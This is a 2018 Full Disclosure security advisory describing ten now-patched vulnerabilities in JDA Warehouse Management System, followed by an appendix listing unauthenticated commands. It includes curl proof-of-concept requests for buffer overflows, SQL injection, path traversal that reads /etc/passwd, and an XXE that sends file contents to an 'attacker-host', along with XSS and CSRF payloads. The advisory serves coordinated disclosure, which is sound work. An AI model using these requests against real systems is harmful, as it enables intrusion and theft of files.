@@ -1,0 +1,724 @@
+
+Date: Sun, 20 May 2018 15:38:50 -0700
+From: Xiaoran Wang via Fulldisclosure <fulldisclosure@...lists.org>
+To: fulldisclosure@...lists.org
+Subject: [FD] JDA Warehouse Management System (WMS) Multiple Critical
+	Vulnerabilities
+
+Introduction
+=========
+Multiple critical vulnerabilities were identified in JDA Warehouse
+management system (WMS).
+The vulnerabilities were discovered during a
+black box security assessment and therefore the vulnerability list
+should not be considered exhaustive.
+
+Affected Software and Versions
+========================
+   - Tested with JDA WMS (most recent version at the date of July 2017)
+   - All vulnerabilities are fixed as of patch 2017.2 (released at the end
+of 2017)
+
+CVE
+===
+No CVEs have been assigned yet.
+
+Author
+=====
+The vulnerabilities were discovered by Xiaoran Wang from Google Security
+Team.
+
+Credit
+=====
+The author would like to thank John Vrankovich from JDA for coordinating
+the security fixes promptly and diligently.
+
+Vulnerability Overview
+=================
+WMS-01 Remote unauthenticated buffer overflow in ./seamles/lib/libSeamLES.so
+WMS-02 Remote unauthenticated buffer overflow in ./moca/lib/MOCAbase.so
+WMS-03 Remote unauthenticated command execution in wmstst
+WMS-04 Remote unauthenticated path traversal and arbitrary file download in
+moca request “download client component”
+WMS-05 Remote unauthenticated SQL injection in wmstst/dcs/lib/DCSint.so
+WMS-06 Remote unauthenticated XXE in WMS backend HTTP service
+WMS-07 No XSS protection in the WMS portal
+WMS-08 Improper CSRF protection
+WMS-09 Unauthenticated RMI Registry and servers from webtst
+WMS-10 Privilege escalation through “compress file” command in moca request
+
+Vulnerability Details
+===============
+----------------------------------------------------------------------------
+WMS-01 Remote unauthenticated buffer overflow in ./seamles/lib/libSeamLES.so
+----------------------------------------------------------------------------
+Severity: CRITICAL
+
+In 0x10c7e6, a strcpy is used to copy the user supplied user_id into a
+buffer of 100 bytes.A user_id that’s longer than 100 bytes will trigger the
+daemon crash, possibly leading to code execution. This can be triggered by
+sending the “sl_log error msg_log” command to a vulnerable WMS wmstst
+server. An example request is like the following. (replace server and port
+with the vulnerable one)
+
+curl -X POST --data "<moca-request
+autocommit='true'><environment></environment><context><field
+name='i_user_id' type='STRING' oper='EQ'>$(python -c 'print
+"A"*1000')</field></context><query>sl_log error
+msg_log</query></moca-request>" --header "content-type:
+application/moca-xml" http://server:port/service
+
+This can be verified by stracing the parent wmstst process and look for new
+child process being spawned.
+sudo strace -ff -s 1500 -p wmstst_parent_pid -e execve
+
+-----------------------------------------------------------------------
+WMS-02 Remote unauthenticated buffer overflow in ./moca/lib/MOCAbase.so
+-----------------------------------------------------------------------
+Severity: CRITICAL
+
+In 0x358D, an array is used to store segments of the format string and it’s
+allocated to hold 300 string segment pointers. However, if an attacker pass
+a format string that has more than 300 formatters, it will overflow the
+stack, possibly causing code execution. This can be triggered by sending
+the “sprintf data” command to a vulnerable WMS wmstst server. An example
+request is like the following. (replace server and port with the vulnerable
+one)
+
+curl -X POST --data "<moca-request
+autocommit='true'><environment></environment><context><field name='format'
+type='STRING' oper='EQ'>$(python -c 'print "%n"*10000')</field><field
+name='args' type='STRING'
+oper='EQ'>aaa,bbb,ccc</field></context><query>sprintf
+data</query></moca-request>" --header "content-type: application/moca-xml"
+http://server:port/service
+
+This can be verified by stracing the parent wmstst process and look for new
+child process being spawned
+sudo strace -ff -s 1500 -p wmstst_parent_pid -e execve,fork,clone
+
+---------------------------------------------------------
+WMS-03 Remote unauthenticated command execution in wmstst
+---------------------------------------------------------
+Severity: CRITICAL
+
+In wmstst, moca-request are sent to the backend server to retrieve data or
+perform tasks. There are 9413 commands (files ends with .mcmd), out of
+which 226 are not authenticated. There are at least a dozen commands within
+this group should be guarded with authentication. For example, (“dump data”
+accepts a “dump_command” parameter that allows arbitrary MOCA command
+execution (all SQL operations, reading files, etc.), “download file”
+downloads any file from the server, “get trace file” also downloads any
+file from the server, “get encryption information” returns the encryption
+key used, “list web session keys” outputs all sessions on the server,
+“compress file” overwrite existing files, etc.)
+
+The list of unauthenticated commands are in Appendix I.
+
+--------------------------------------------------------------------------------------------------------------------
+WMS-04 Remote unauthenticated path traversal and arbitrary file download in
+moca request “download client component”
+--------------------------------------------------------------------------------------------------------------------
+Severity: CRITICAL
+
+The “download client component” looks for files to download within two
+dozen directories in
+“/export/jda/wmstst/(mcs|sal|moca|mtf|dcs|les|seamles)/downloads/(forms|components|res|help|xsl)/”.
+However, it does not prevent the user from putting “../../” into the file
+name, bypassing the restriction. For example, sending the following request
+to the vulnerable command handler downloads /etc/passwd from the host. This
+is high risk as the endpoint is also not authenticated.
+
+curl -X POST --data '<moca-request
+autocommit="true"><environment></environment><context><field
+name="filename" type="STRING"
+oper="EQ">../../../../../../../../etc/passwd</field></context><query>download
+client component</query></moca-request>' --header "content-type:
+application/moca-xml" http://host:port/service (replace host and port with
+the vulnerable service)
+
+-----------------------------------------------------------------------
+WMS-05 Remote unauthenticated SQL injection in wmstst/dcs/lib/DCSint.so
+-----------------------------------------------------------------------
+Severity: CRITICAL
+
+In intGetNextLabel, a SQL statement like the following is constructed where
+the %s is replaced by used supplied string without sanitization. "select
+'X' from prsmst where prtadr = '%s'  and rerprt is not null ". This can be
+triggered by sending a “get next label” query to the vulnerable wmstst moca
+service handler
+
+curl -X POST --data "<moca-request
+autocommit='true'><environment></environment><context><field name='prtadr'
+type='STRING' oper='EQ'>' or 'x'='y'--'</field></context><query>get next
+label</query></moca-request>" --header "content-type: application/moca-xml"
+http://server:port/service
+Response indicates a SQL error. Database Error: 511 - ORA-00907: missing
+right parenthesis
+
+-------------------------------------------------------------
+WMS-06 Remote unauthenticated XXE in WMS backend HTTP service
+-------------------------------------------------------------
+Severity: HIGH
+
+The backend service listening on port 4650 is vulnerable to XXE and allows
+an attacker to steal any files that the user “wmstst” is able to access. To
+reproduce,
+1. Create a file that’s accessible to wmstst, such as /tmp/secretfile with
+mode 744. Put some content into the file, such as “topsecret_included”.
+This is the target file we want to steal.  (echo “topsecret_included” >
+/tmp/secretfile&& chmod 744 /tmp/secret)
+2. On the attacker server, start a simple HTTP server with the following
+file to be served. Replace your attacker-host and attacker-port.
+ee.xml, <!ENTITY % data SYSTEM "file:///tmp/secretfile"><!ENTITY % param1
+"<!ENTITY &#x25; exfil SYSTEM 'http://attacker-host:attacker-port
+/?%data;'>">
+3. Send the following curl request to the vulnerable backend HTTP service.
+(replace attacker-host and attacker-port with your own, same as victim-host
+and victim-port)
+curl -X POST --data '<?xml version="1.0" ?> <!DOCTYPE r [ <!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://attacker-host:attacker-port/ee.xml"> %sp;
+%param1; %exfil; ]><moca-request
+autocommit="true"><environment></environment><query>get encryption
+information</query></moca-request>' --header "content-type:
+application/moca-xml" http://victim-host:victim-port/service
+4. Observe the HTTP server log to see the content of the secret being
+sniffed out
+
+------------------------------------------
+WMS-07 No XSS protection in the WMS portal
+------------------------------------------
+Severity: MEDIUM
+
+Inputting any field with scripts such as “<img src=x onerror=alert(2)>”
+will trigger the script to execute. This happens in editing field names,
+searching keywords, etc. An attacker can inject a malicious script to run
+in the victim’s context and steal data.
+There’s a referrer check that enforces the data is coming only from the
+same domain. However checking for referrer is not sufficient as there are
+always ways to bypass it. For example, the referrer checks in this case
+does not enforce HTTPS on the referrer, allowing a network attacker to
+spoof a HTTP site with the same domain.
+
+-------------------------------
+WMS-08 Improper CSRF protection
+-------------------------------
+Severity: MEDIUM
+
+There is a CSRF token in every request to the main WMS portal, however the
+CSRF token is in the cookie. This defeat the purpose of CSRF protection as
+browsers send them automatically along with other cookies. For example,
+sending the following requests (with the right headers and cookie values)
+result in change of data at the backend.
+
+POST /data/WM/wm/addresses?siteId=DC0001&_dc=1497973569329 HTTP/1.1
+Host: wms-host
+Cookie: REFSSessionID=jkhj; JDA-CSRF=3738e726-aec2-4222-bbff-47a6116e371c
+
+{"addressId":"","hostExternalId":"","addressName":"<IMG SRC=X
+ONERROR=ALERT(101)>","addressLine1":"<IMG SRC=X
+ONERROR=ALERT(104)>","addressLine2":"<IMG SRC=X
+ONERROR=ALERT(105)>","addressLine3":"","city":"Ylo","state":"<IMG SRC=X
+ONERROR=ALERT(107)>","postalCode":"12345","addressType":"SUP","clientId":"E1000","countryName":"","phoneNumber":"","timeZone":"","firstName":"asdsad","lastName":"asdasdsad","localeId":"","customsSiteType":"","globalLocationNumber":"","customsTaxSite":"","temporary":false,"residentialAddress":false,"receivingWebAddress":"","contactName":"","contactPhone":"","attentionPhone":"","faxNumber":"","email":"","contactTitle":"","attentionName":"","shippingPhone":"","shippingWebAddress":"","shippingContactName":"","shippingContactPhone":"","shippingAttentionPhone":"","shippingFax":"","shippingEmail":"","shippingContactTitle":"","shippingAttentionName":"","honorific":"","addressDistrict":"","poBoxFlag":false,"poolPointFlag":false,"poolRatingServiceName":"","region":"","latitude":"","longitude":""}
+
+-----------------------------------------------------------
+WMS-09 Unauthenticated RMI Registry and servers from webtst
+-----------------------------------------------------------
+Severity: MEDIUM
+
+Webtst uses ehcache, which listens for cache syncs from peers. It opens
+port 40001 as its RMI registry exposing objects such as tokenCache,
+sessionCache, exportCache, etc. that stores authentication tokens, session
+information, and exported data from WMS. All of them can be accessed
+without authentication. The RMI server lives on port 40340 however for some
+reason the server is not running or started correctly. Hence, the severity
+of the issue is only moderate.
+Through unauthenticated RMI registry port 40001, it’s also discovered that
+RMI objects “hotfixes, nodeInfo and cacheEventBus” are available on port
+46978. Connecting to 46978 required no authentication and an attacker can
+use “object.getElements(object.getKeys())” to get all of the attributes in
+those objects, as well as potentially invoking other functions.
+
+---------------------------------------------------------------------------
+WMS-10 Privilege escalation through “compress file” command in moca request
+---------------------------------------------------------------------------
+Severity: MEDIUM
+
+The “compress file” command in ./mcs/src/cmdsrc/mcsbase/compress_file.mcmd
+compress a file given its path specified in the request and put the
+compressed file in the same directory with an extension also specified in
+the request. Unfortunately the compressed file is always world readable
+even if the previous file is not. An attacker can leverage this to read
+files that they do not have access to. For example,
+1. create a file named /tmp/secretfile and give it 640 permission.
+2. Send the following request to compress the file.  (replace the server
+and port to be the vulnerable moca server)
+curl -X POST --data '<moca-request
+autocommit="true"><environment></environment><context><field
+name="filename" type="STRING" oper="EQ">/tmp/secretfile</field><field
+name="extension" type="STRING"
+oper="EQ">gz</field></context><query>compress file</query></moca-request>'
+--header "content-type: application/moca-xml" http://server:port/service
+3. A new compressed file is created in /tmp/secretfile.gz which will be
+world readable.
+
+-------------------------------------------------
+Appendix I: List of unauthenticated moca requests
+-------------------------------------------------
+./seamles/src/cmdsrc/SeamLES/translate_control_characters_to_string.mcmd
+     translate control characters to string
+./seamles/src/cmdsrc/SeamLES/sl_get_now.mcmd
+     sl_get now
+./seamles/src/cmdsrc/SeamLES/sl_handle_xml_file_using_stax.mcmd
+      sl_handle xml_file_using_stax
+./seamles/src/cmdsrc/SeamLES/sl_db_constraint.mcmd
+     sl_db constraint
+./seamles/src/cmdsrc/SeamLES/sl_free_java_cache.mcmd
+     sl_free java_cache
+./seamles/src/cmdsrc/SeamLES/sl_list_ftp_files.mcmd
+      sl_list ftp_files
+./seamles/src/cmdsrc/SeamLES/sl_handle_xml_file_using_dom.mcmd
+     sl_handle xml_file_using_dom
+./seamles/src/cmdsrc/SeamLES/sl_get_ifd_data_as_xml_str.mcmd
+     sl_get ifd_data_as_xml_str
+./seamles/src/cmdsrc/SeamLES/sl_send_ifd_data_xml_get.mcmd
+     sl_send ifd_data_xml_get
+./seamles/src/cmdsrc/SeamLES/sl_handle_xml_string_using_dom.mcmd
+     sl_handle xml_string_using_dom
+./seamles/src/cmdsrc/SeamLES/sl_send_ifd_data_xml_init.mcmd
+      sl_send ifd_data_xml_init
+./seamles/src/cmdsrc/SeamLES/sl_get_transformed_xml_string.mcmd
+      sl_get transformed_xml_string
+./seamles/src/cmdsrc/SeamLES/sl_send_file_to_sftp.mcmd
+     sl_send file_to_sftp
+./seamles/src/cmdsrc/SeamLES/sl_list_sl_version.mcmd
+     sl_list sl_version
+./seamles/src/cmdsrc/SeamLES/sl_validate_xml_file.mcmd
+     sl_validate xml_file
+./seamles/src/cmdsrc/SeamLES/translate_string_to_control_characters.mcmd
+     translate string to control characters
+./seamles/src/cmdsrc/SeamLES/sl_send_file_to_ftp.mcmd
+      sl_send file_to_ftp
+./seamles/src/cmdsrc/SeamLES/sl_db_import_constraints.mcmd
+     sl_db import_constraints
+./seamles/src/cmdsrc/SeamLES/sl_list_sftp_files.mcmd
+     sl_list sftp_files
+./seamles/src/cmdsrc/SeamLES/sl_get_transformed_xml_file.mcmd
+      sl_get transformed_xml_file
+./seamles/src/cmdsrc/SeamLES/sl_log_error_msg_log.mcmd
+     sl_log error msg_log
+./seamles/src/cmdsrc/SeamLES/sl_get_ifd_data_for_head_event.mcmd
+     sl_get ifd_data_for_head_event
+./seamles/src/cmdsrc/SeamLES/sl_pkchange_description.mcmd
+      sl_pkchange description
+./seamles/src/cmdsrc/SeamLES/sl_send_ifd_data_xml_add.mcmd
+     sl_send ifd_data_xml_add
+./seamles/src/cmdsrc/SeamLES/sl_get_trigger_file_name.mcmd
+     sl_get trigger_file_name
+./seamles/src/cmdsrc/SeamLES/sl_handle_xml_string_using_stax.mcmd
+      sl_handle xml_string_using_stax
+./seamles/src/cmdsrc/SeamLES/sl_convert_xml_data_by_unescaping.mcmd
+      sl_convert xml_data_by_unescaping
+./seamles/src/cmdsrc/SeamLES/sl_db_create_constraint.mcmd
+      sl_db create_constraint
+./seamles/src/cmdsrc/SeamLES/sl_check_perf_post_proc_ifd_for_xml.mcmd
+      sl_check perf_post_proc_ifd_for_xml
+./seamles/src/cmdsrc/SeamLES/generate_pk_colval.mcmd
+     generate pk colval
+./seamles/src/cmdsrc/SeamLES/sl_send_ifd_data_xml_finish.mcmd
+      sl_send ifd_data_xml_finish
+./seamles/src/cmdsrc/sljsock/sl_jsock_send_msg_vcstd_hardware.mcmd
+     sl_jsock send_msg vcstd hardware
+./seamles/src/cmdsrc/sljsock/sl_jsock_reply_msg_dm.mcmd
+      sl_jsock reply_msg dm
+./seamles/src/cmdsrc/sljsock/sl_jsock_reply_msg_vcstd_hardware.mcmd
+      sl_jsock reply_msg vcstd hardware
+./seamles/src/cmdsrc/sljsock/sl_jsock_reply_msg_vcodr.mcmd
+     sl_jsock reply_msg vcodr
+./seamles/src/cmdsrc/sljsock/sl_jsock_proc_inb_thread_vox.mcmd
+     sl_jsock proc_inb_thread vox
+./seamles/src/cmdsrc/sljsock/sl_jsock_reply_msg_wcs.mcmd
+     sl_jsock reply_msg wcs
+./seamles/src/cmdsrc/sljsock/sl_jsock_proc_inb_thread_wcs.mcmd
+     sl_jsock proc_inb_thread wcs
+./seamles/src/cmdsrc/sljsock/sl_jsock_proc_inb_thread_std.mcmd
+     sl_jsock proc_inb_thread std
+./seamles/src/cmdsrc/sljsock/sl_jsock_send_msg_dm.mcmd
+     sl_jsock send_msg dm
+./seamles/src/cmdsrc/sljsock/sl_jsock_reply_msg_vcstd.mcmd
+     sl_jsock reply_msg vcstd
+./seamles/src/cmdsrc/sljsock/sl_jsock_send_msg_wcs.mcmd
+      sl_jsock send_msg wcs
+./seamles/src/cmdsrc/sljsock/sl_jsock_proc_inb_thread_vc.mcmd
+      sl_jsock proc_inb_thread vc
+./seamles/src/cmdsrc/sljsock/sl_jsock_send_msg_vcodr.mcmd
+      sl_jsock send_msg vcodr
+./seamles/src/cmdsrc/sljsock/sl_jsock_reply_msg_std.mcmd
+     sl_jsock reply_msg std
+./seamles/src/cmdsrc/sljsock/sl_jsock_send_msg_std.mcmd
+      sl_jsock send_msg std
+./seamles/src/cmdsrc/sljsock/sl_jsock_proc_inb_thread_vcstd.mcmd
+     sl_jsock proc_inb_thread vcstd
+./seamles/src/cmdsrc/sljsock/sl_jsock_reply_msg_vc.mcmd
+      sl_jsock reply_msg vc
+./seamles/src/cmdsrc/sljsock/sl_jsock_reply_msg_vcstd_test_alg.mcmd
+      sl_jsock reply_msg vcstd test alg
+./seamles/src/cmdsrc/sljsock/sl_jsock_proc_inb_thread_vcodr.mcmd
+     sl_jsock proc_inb_thread vcodr
+./seamles/src/cmdsrc/sljsock/sl_jsock_send_msg_vc.mcmd
+     sl_jsock send_msg vc
+./seamles/src/cmdsrc/sljsock/sl_jsock_reply_msg_vox.mcmd
+     sl_jsock reply_msg vox
+./seamles/src/cmdsrc/sljsock/sl_jsock_proc_inb_thread_dm.mcmd
+      sl_jsock proc_inb_thread dm
+./seamles/src/cmdsrc/sljsock/sl_jsock_send_msg_vox.mcmd
+      sl_jsock send_msg vox
+./seamles/samples/transactions/inbound/edi_940/src/cmdsrc/samplejava/identify_sample_segment_edi_940.mcmd
+identify sample_segment_edi_940
+./mcs/src/cmdsrc/mcsbase/compress_file.mcmd
+      compress file
+./mcs/src/cmdsrc/mcsbase/list_toolbar_config.mcmd
+      list toolbar config
+./mcs/src/cmdsrc/mcsbase/list_grid_definitions.mcmd
+      list grid definitions
+./mcs/src/cmdsrc/mcsbase/get_addon_id_keys.mcmd
+      get addon_id keys
+./mcs/src/cmdsrc/mcsbase/list_work_flow_form_link.mcmd
+     list work flow form link
+./mcs/src/cmdsrc/mcsbase/get_dynamic_rf_configurations.mcmd
+      get dynamic rf configurations
+./mcs/src/cmdsrc/mcsbase/get_buttonbar.mcmd
+      get buttonbar
+./mcs/src/cmdsrc/mcsbase/get_client_hooks.mcmd
+     get client hooks
+./mcs/src/cmdsrc/mcsbase/get_grid_config.mcmd
+      get grid config
+./mcs/src/cmdsrc/mcsbase/get_rdt_variable_lookup.mcmd
+      get rdt variable lookup
+./mcs/src/cmdsrc/mcsbase/get_policy_information.mcmd
+     get policy information
+./mcs/src/cmdsrc/mcsbase/get_form_file.mcmd
+      get form file
+./mcs/src/cmdsrc/mcsbase/convert_user_password_decrypt.mcmd
+      convert user password decrypt
+./mcs/src/cmdsrc/mcsbase/get_policy_fields.mcmd
+      get policy fields
+./mcs/src/cmdsrc/mcsbase/list_grid_view_details.mcmd
+     list grid view details
+./mcs/src/cmdsrc/mcsbase/get_les_lookups.mcmd
+      get les lookups
+./mcs/src/cmdsrc/mcsbase/list_grid_views.mcmd
+      list grid views
+./mcs/src/cmdsrc/mcsbase/download_client_component.mcmd
+      download client component
+./mcs/src/cmdsrc/mcsbase/get_work_flow.mcmd
+      get work flow
+./mcs/src/cmdsrc/mcsbase/get_les_custom_field.mcmd
+     get les custom field
+./mcs/src/cmdsrc/mcsbase/get_command_columns.mcmd
+      get command columns
+./mcs/src/cmdsrc/mcsbase/get_system_comment.mcmd
+     get system comment
+./mcs/src/cmdsrc/mcsbase/get_work_flow_data.mcmd
+     get work flow data
+./mcs/src/cmdsrc/mcsbase/list_buttonbar_config.mcmd
+      list buttonbar config
+./mcs/src/cmdsrc/mcsbase/get_les_actions.mcmd
+      get les actions
+./mcs/src/cmdsrc/mcsbase/get_buttons.mcmd
+      get buttons
+./mcs/src/cmdsrc/mcsbase/get_buttonbar_config.mcmd
+     get buttonbar config
+./mcs/src/cmdsrc/mcsbase/convert_user_password_encrypt.mcmd
+      convert user password encrypt
+./mcs/src/cmdsrc/mcsbase/get_form_data.mcmd
+      get form data
+./mcs/src/cmdsrc/mcsbase/get_les_command.mcmd
+      get les command
+./mcs/src/cmdsrc/mcsbase/get_les_lookup.mcmd
+     get les lookup
+./mcs/src/cmdsrc/mcsbase/get_dynamic_configurations.mcmd
+     get dynamic configurations
+./mcs/src/cmdsrc/mcsbase/get_les_variable_lookup.mcmd
+      get les variable lookup
+./mcs/src/cmdsrc/mcsbase/get_password_expiration_information.mcmd
+      get password expiration information
+./mcs/src/cmdsrc/mcsbase/get_grid_display_rules.mcmd
+     get grid display rules
+./mcs/src/cmdsrc/mcsbase/get_policy_field_values.mcmd
+      get policy field values
+./mcs/src/cmdsrc/mcsbase/get_system_update_info.mcmd
+     get system update info
+./mcs/src/cmdsrc/mcsbase/check_single_signon.mcmd
+      check single signon
+./mcs/src/cmdsrc/mcsbase/list_work_flow_apps.mcmd
+      list work flow apps
+./mcs/src/cmdsrc/mcsbase/download_file.mcmd
+      download file
+./mcs/src/cmdsrc/mcsbase/get_les_variable_input.mcmd
+     get les variable input
+./mcs/src/cmdsrc/mcsbase/list_comp_versions.mcmd
+     list comp versions
+./mcs/src/cmdsrc/mcsbase/get_toolbar_config.mcmd
+     get toolbar config
+./mcs/src/cmdsrc/mcsbase/get_policy_areas.mcmd
+     get policy areas
+./mcs/src/cmdsrc/mcsbase/get_les_variable_configuration.mcmd
+     get les variable configuration
+./mcs/src/cmdsrc/mcsbase/get_addon_id.mcmd
+     get addon_id
+./mcs/src/cmdsrc/mcsbase/list_work_flow.mcmd
+     list work flow
+./mcs/src/cmdsrc/mcsbase/get_system_update_timestamp.mcmd
+      get system update timestamp
+./mcs/src/cmdsrc/mcsbase/get_les_variable_validation.mcmd
+      get les variable validation
+./mcs/src/cmdsrc/mcsbase/list_grid_menu_items.mcmd
+     list grid menu items
+./mcs/src/cmdsrc/mcsbase/get_les_variable_valid_possibility.mcmd
+     get les variable valid possibility
+./mcs/src/cmdsrc/mcsbase/get_les_variable_default.mcmd
+     get les variable default
+./mcs/src/cmdsrc/mcsbase/get_trace_file_size.mcmd
+      get trace file size
+./mcs/src/cmdsrc/mcsbase/acknowledge_message_for_device.mcmd
+     acknowledge message for device
+./mcs/src/cmdsrc/mcsbase/get_toolbar.mcmd
+      get toolbar
+./mcs/src/cmdsrc/mcsbase/get_les_lookup_field.mcmd
+     get les lookup field
+./mcs/src/cmdsrc/mcsbase/get_les_variable.mcmd
+     get les variable
+./mcs/src/cmdsrc/mcsbase/check_for_messages.mcmd
+     check for messages
+./mcs/src/cmdsrc/mcsbase/get_top_level_buttons.mcmd
+      get top level buttons
+./mcs/src/cmdsrc/mcsbase/get_host_name.mcmd
+      get host name
+./mcs/src/cmdsrc/mcsbase/list_work_flow_forms.mcmd
+     list work flow forms
+./mcs/src/cmdsrc/mcsbase/get_rdt_var_config.mcmd
+     get rdt var config
+./mcs/src/cmdsrc/mcsbase/list_grid_views_by_user.mcmd
+      list grid views by user
+./mcs/src/cmdsrc/mcsbase/get_cache_time_stamp.mcmd
+     get cache time stamp
+./mcs/src/cmdsrc/mcsbase/get_login_fields.mcmd
+     get login fields
+./mcs/src/cmdsrc/mcssecurity/change_option.mcmd
+      change option
+./mcs/src/cmdsrc/mcssecurity/login_user.mcmd
+     login user
+./mcs/src/cmdsrc/mcssecurity/validate_user_password.mcmd
+     validate user password
+./mcs/src/cmdsrc/mcssecurity/remove_option.mcmd
+      remove option
+./mcs/src/cmdsrc/mcssecurity/validate_federale_authentication_request.mcmd
+     validate federale authentication request
+./mcs/src/cmdsrc/mcssecurity/handle_login_failure.mcmd
+     handle login failure
+./mcs/src/cmdsrc/mcssecurity/get_login_fields_data.mcmd
+      get login fields data
+./mcs/src/cmdsrc/mcsi18n/get_rdt_mls_catalog.mcmd
+      get rdt mls catalog
+./mcs/src/cmdsrc/mcsi18n/get_les_mls_catalog.mcmd
+      get les mls catalog
+./mcs/src/cmdsrc/mcsi18n/get_system_description.mcmd
+     get system description
+./mcs/src/cmdsrc/mcsi18n/get_time_zone_information.mcmd
+      get time zone information
+./mcs/src/cmdsrc/mcsi18n/get_mls_text.mcmd
+     get mls text
+./mcs/src/cmdsrc/mcsi18n/get_mls_catalog.mcmd
+      get mls catalog
+./moca/src/cmdsrc/mocabase/get_encryption_information.mcmd
+     get encryption information
+./moca/src/cmdsrc/mocabase/decrypt_file_using_RPBF.mcmd
+      decrypt file using RPBF
+./moca/src/cmdsrc/mocabase/get_trace_file.mcmd
+     get trace file
+./moca/src/cmdsrc/mocabase/reorder_columns.mcmd
+      reorder columns
+./moca/src/cmdsrc/mocabase/dump_data.mcmd
+      dump data
+./moca/src/cmdsrc/mocabase/sprintf_data.mcmd
+     sprintf data
+./moca/src/cmdsrc/mocabase/set_process_priority.mcmd
+     set process priority
+./moca/src/cmdsrc/mocabase/format_data.mcmd
+      format data
+./moca/src/cmdsrc/mocabase/check_command_syntax.mcmd
+     check command syntax
+./moca/src/cmdsrc/mocabase/get_db.mcmd
+     get db
+./moca/src/cmdsrc/mocabase/list_library_versions.mcmd
+      list library versions
+./moca/src/cmdsrc/mocabase/get_current_trace_levels.mcmd
+     get current trace levels
+./moca/src/cmdsrc/mocabase/set_trace.mcmd
+      set trace
+./moca/src/cmdsrc/mocabase/encrypt_file_using_RPBF.mcmd
+      encrypt file using RPBF
+./moca/src/cmdsrc/mocabase/list_library_version.mcmd
+     list library version
+./moca/src/cmdsrc/mocabase/format_control_file.mcmd
+      format control file
+./moca/src/cmdsrc/mocasecurity/login_webservice.mcmd
+     login webservice
+./moca/src/cmdsrc/mocasecurity/login_user.mcmd
+     login user
+./moca/src/cmdsrc/mocasecurity/validate_federated_authentication_request.mcmd
+  validate federated authentication request
+./moca/src/cmdsrc/mocasecurity/validate_federale_authentication_request.mcmd
+   validate federale authentication request
+./moca/src/cmdsrc/mocaems/log_ems_event.mcmd
+     log ems event
+./moca/src/cmdsrc/mocaems/submit_ems_primed_event.mcmd
+     submit ems primed event
+./moca/src/cmdsrc/mocaems/submit_ems_raised_events.mcmd
+      submit ems raised events
+./moca/samples/server/java/sample_create_results.mcmd
+      sample create results
+./moca/samples/server/java/sample_get_map.mcmd
+     sample get map
+./moca/samples/server/java/sample_split_mapping.mcmd
+     sample split mapping
+./moca/samples/server/java/sample_do_something.mcmd
+      sample do something
+./moca/samples/server/java/sample_add_map.mcmd
+     sample add map
+./moca/samples/server/java/sample_create_map.mcmd
+      sample create map
+./moca/samples/server/java/sample_list_foo.mcmd
+      sample add map
+./moca/samples/server/java/sample_split_string.mcmd
+      sample split string
+./moca/samples/server/java/sample_get_dst.mcmd
+     sample get dst
+./moca/samples/server/java/sample_hello_world.mcmd
+     sample hello world
+./sal/src/cmdsrc/salweb/remove_web_session.mcmd
+      remove web session
+./sal/src/cmdsrc/salweb/list_web_session_keys.mcmd
+     list web session keys
+./sal/src/cmdsrc/salweb/list_web_sessions.mcmd
+     list web sessions
+./sal/src/cmdsrc/salweb/get_web_device_types.mcmd
+      get web device types
+./sal/src/cmdsrc/salweb/list_web_session_ages.mcmd
+     list web session ages
+./sal/src/cmdsrc/salweb/list_active_users.mcmd
+     list active users
+./sal/src/cmdsrc/salbase/check_3pl_single_client_diasable.mcmd
+     check 3pl single client disable
+./sal/src/cmdsrc/salbase/create_velocity_type.mcmd
+     create velocity type
+./sal/src/cmdsrc/salbase/change_velocity_type.mcmd
+     change velocity type
+./dcs/src/cmdsrc/dcsint/list_rf_policies.mcmd
+      list rf policies
+./dcs/src/cmdsrc/dcsint/get_next_label.mcmd
+      get next label
+./dcs/src/cmdsrc/dcsint/load_rf_policies.mcmd
+      load rf policies
+./dcs/src/cmdsrc/dcsint/get_label_file.mcmd
+      get label file
+./dcs/src/cmdsrc/dcsint/get_next_bom_line.mcmd
+     get next bom line
+./dcs/src/cmdsrc/dcsint/get_addon_id.mcmd
+      get addon_id
+./dcs/src/cmdsrc/dcsint/get_next_note_line.mcmd
+      get next note line
+./dcs/src/cmdsrc/dcsint/get_next_invoice_line.mcmd
+     get next invoice line
+./dcs/src/cmdsrc/dcsint/get_login_fields.mcmd
+      get login fields
+./dcs/src/cmdsrc/dcslm/create_assignment_from_result_set.mcmd
+      create assignment from result set
+./dcs/src/cmdsrc/dcsrf/check_single_scan_loading_for_fluid_load.mcmd
+     check single scan loading for fluid load
+./dcs/src/cmdsrc/dcsrf/acknowledge_message_for_device.mcmd
+     acknowledge message for device
+./dcs/src/cmdsrc/dcsrpweb/list_rf_vendors_for_web.mcmd
+     list rf vendors for web
+./dcs/src/cmdsrc/dcsdyncfg/configure_set_maxqvl_flag.mcmd
+      configure setmaxqvl flag
+./dcs/src/cmdsrc/dcsdyncfg/configure_export_type_for_order_line.mcmd
+     configure export type for order line
+./dcs/src/cmdsrc/dcsdyncfg/configure_dynamic_slotting_fields.mcmd
+      configure dynamic slotting fields
+./dcs/src/cmdsrc/dcsdyncfg/configure_inventory_service_type_new_mode.mcmd
+      configure inventory service type new mode
+./dcs/src/cmdsrc/dcsdyncfg/configure_mincatch_qty.mcmd
+     configure mincatch quantity
+./dcs/src/cmdsrc/dcsdyncfg/configure_rft_rackquiz.mcmd
+     configure rft rackquiz
+./dcs/src/cmdsrc/dcsdyncfg/configure_supplier_consigned_fields_for_receiving.mcmd
+configure supplier consigned fields for receiving
+./dcs/src/cmdsrc/dcsdyncfg/configure_form_close_trlr_fields.mcmd
+     configure form close_trlr fields
+./dcs/src/cmdsrc/dcsdyncfg/configure_trlr_num_criteria_mode.mcmd
+     configure trlr_num criteria mode
+./dcs/src/cmdsrc/dcsdyncfg/configure_cnfrm_asset_tag_field_enable.mcmd
+     configure cnfrm_asset_tag field enable
+./dcs/src/cmdsrc/dcsdyncfg/configure_inventory_service_type_criteria_mode.mcmd
+ configure inventory service type criteria mode
+./dcs/src/cmdsrc/dcsdyncfg/configure_supplier_consigned_fields.mcmd
+      configure supplier consigned fields
+./dcs/src/cmdsrc/dcsdyncfg/configure_cnfrm_trailer_asset_tag_field.mcmd
+      configure cnfrm trailer asset tag field
+./dcs/src/cmdsrc/dcsdyncfg/configure_check_in_trailer_asset_fields_enable.mcmd
+ configure check in trailer asset fields enable
+./dcs/src/cmdsrc/dcsdyncfg/configure_invalid_cat_button.mcmd
+     configure invalid cat button
+./dcs/src/cmdsrc/dcsdyncfg/configure_fields_for_pickup.mcmd
+      configure fields for pickup
+./dcs/src/cmdsrc/dcsdyncfg/configure_allocatecatch_quantity.mcmd
+     configure allocatecatch quantity
+./dcs/src/cmdsrc/dcsdyncfg/configure_fields_for_asset_typ.mcmd
+     configure fields for asset typ
